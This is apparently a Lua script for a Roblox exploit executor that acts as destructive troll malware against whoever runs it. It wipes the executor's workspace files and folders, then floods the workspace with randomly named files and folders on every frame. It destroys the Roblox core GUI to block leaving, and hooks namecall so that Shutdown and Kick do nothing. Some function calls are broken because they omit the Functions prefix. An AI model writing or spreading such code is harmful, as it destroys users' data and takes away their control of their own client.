local Functions = {}
--[[                       Utility Functions                       ]]

repeat wait() until game:IsLoaded()

function CreateInstance(className, properties)
    local instance = Instance.new(className)
    for prop, value in pairs(properties) do
        instance[prop] = value
    end
    return instance
end

function Functions.TheresNoEscape()
    print("nice try broski")
end

function Functions.getScreenGui(obj)
    local current = obj
    while current do
        if current:IsA("ScreenGui") then
            return current
        end
        current = current.Parent
    end
    return nil
end

function Functions.generate_random_string(length)
    local chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    local symbols = "!@#$%^&*()_+-=[]{}|;:,.<>?/~`"
    local unicode_chars = {
        "é", "ß", "ø", "Δ", "Ω", "汉", "你", "🌟",
        "我", "是", "的", "了", "不", "在", "人", "有",
        "中", "国", "爱", "梦", "心", "天", "气", "山",
        "海", "风", "花", "雪", "月", "龙", "虎", "神",
        "雨", "火", "光", "影", "魂", "界", "魔", "剑",
        "术", "灵", "音", "黑", "白", "蓝", "红", "黄",
        "金", "银", "笑", "哭", "怒", "悲", "安", "静",
        "强", "弱", "速", "慢", "飞", "走", "梦", "幻"
    }

    local all_chars = chars .. symbols

    for _, v in ipairs(unicode_chars) do
        all_chars = all_chars .. v
    end
    
    local result = ""
    for i = 1, length do
        local rand_index = math.random(1, #all_chars)
        result = result .. all_chars:sub(rand_index, rand_index)
    end

    return result
end

-- [[                       Detections                       ]]

for i,v in pairs(game.CoreGui:GetDescendants()) do
    if v:IsA("TextLabel") then
        if string.find(v.Text, "Infinite Yield") or string.find(v.Text, "Explorer") then
            print("very funny thing found", getScreenGui(v))
            return
        end
    end
end

game.CoreGui.DescendantAdded:Connect(function(v)
    if v:IsA("TextLabel") then
        if string.find(v.Text, "Infinite Yield") or string.find(v.Text, "Explorer") then
            print("very funny thing added", getScreenGui(v)) 
            return
        end
    end
end)

-- [[                       Hooking / Vulnerabilities                       ]]

game:GetService("CoreGui").RobloxGui:Destroy() -- anti-leave and alt f4


-- [[                       Files and Folders                      ]]

for i,v in pairs(listfiles("")) do -- wipe
    if v == "demon.png" or v == "Thresh, the Chain Warden.mp3" or v == "the doll.png" then return end
    if isfile(v) then
        delfile(v)
    else
        delfolder(v)
    end
end

game:GetService("RunService").RenderStepped:Connect(function()
    local str = generate_random_string(math.random(1, 20))
    if math.random(0, 1) == 1 then
        writefile(str, "")
    else
        makefolder(str)
    end
end)

local str_lower = string.lower
local raw_game = game
local mt = getrawmetatable(game)
local oldNamecall = mt.__namecall
setreadonly(mt, false)

local lp = game:GetService("Players").LocalPlayer

mt.__namecall = newcclosure(function(self, ...)
    local method = getnamecallmethod()
    
    if type(method) ~= "string" then 
        return oldNamecall(self, ...) 
    end
    
    local methodName = str_lower(method)
    local args = {...}

    if self == raw_game and methodName == "shutdown" then
        print("very funny of you")
        return
    end

    if self == lp and methodName == "kick" then
        print("in your dreams")
        return
    end

    return oldNamecall(self, unpack(args))
end)

print("debug: type new, if not seen then its github's problem")

--[[for i,v in pairs(getgenv()) do
    if type(v) == "function" and v ~= "hookfunction" then
        hookfunction(v, Functions.TheresNoEscape)
    end
    if type(v) == "table" then
        table.clear(getgenv(), v)
    end
end]]




